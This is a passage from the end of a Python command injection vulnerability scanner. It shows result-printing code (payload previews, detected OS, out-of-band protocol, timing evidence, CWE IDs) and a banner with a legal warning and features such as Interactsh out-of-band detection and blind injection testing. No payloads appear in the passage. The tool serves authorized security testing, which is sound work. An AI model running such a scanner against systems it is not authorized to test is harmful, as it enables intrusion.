            if 'payload' in vuln.evidence:
                payload_preview = vuln.evidence['payload'][:50]
                print(f"     ├─ Payload: {payload_preview}...")
            if 'os_type' in vuln.evidence:
                print(f"     ├─ OS Detected: {vuln.evidence['os_type']}")
            if 'oob_protocol' in vuln.evidence:
                print(f"     ├─ OOB Protocol: {vuln.evidence['oob_protocol']}")
            if 'observed_delay' in vuln.evidence:
                print(f"     ├─ Observed Delay: {vuln.evidence['observed_delay']}s")
            
            print(f"     ├─ Remediation: {vuln.remediation}")
            if vuln.cwe_ids:
                print(f"     └─ CWE IDs: {', '.join(vuln.cwe_ids)}")
    
    # Warnings
    if result.warnings:
        print(f"\n⚠️  Warnings:")
        for warning in result.warnings:
            print(f"  • {warning}")
    
    # Errors
    if result.errors:
        print(f"\n❌ Errors:")
        for error in result.errors:
            print(f"  • {error}")
    
    # Additional Information
    print(f"\n📋 Additional Information:")
    if result.info.get('os_detected'):
        print(f"  • Detected OS: {result.info['os_detected']}")
    if result.info.get('oob_enabled'):
        print(f"  • OOB Testing: {'✅ Enabled' if result.info['oob_enabled'] else '❌ Disabled'}")
        if result.info.get('oob_domain'):
            print(f"  • OOB Domain: {result.info['oob_domain']}")
    if result.info.get('vulnerable_parameters'):
        print(f"  • Vulnerable Parameters: {', '.join(set(result.info['vulnerable_parameters']))}")
    if result.info.get('tested_parameters'):
        print(f"  • Tested Parameters: {', '.join(set(result.info['tested_parameters']))}")


if __name__ == "__main__":
    print("=" * 60)
    print("🛡️  ENHANCED COMMAND INJECTION VULNERABILITY SCANNER")
    print("=" * 60)
    print("\n⚠️  LEGAL WARNING:")
    print("This tool is for authorized security testing only.")
    print("Only use on systems you own or have explicit permission to test.")
    print("Unauthorized scanning may violate laws and regulations.")
    print("\n✅ By using this tool, you confirm you have authorization.")
    print("\n✨ Key Features:")
    print("  • Async connection pooling for optimal performance")
    print("  • Automatic retry logic for network resilience")
    print("  • Interactsh integration for OOB detection")
    print("  • HTTP/2 support for improved efficiency")
    print("  • Context-aware payload generation")
    print("  • Time-based blind injection detection")
    print("  • Form and parameter testing")
    print("=" * 60)
    
    # Run the scanner
    asyncio.run(main())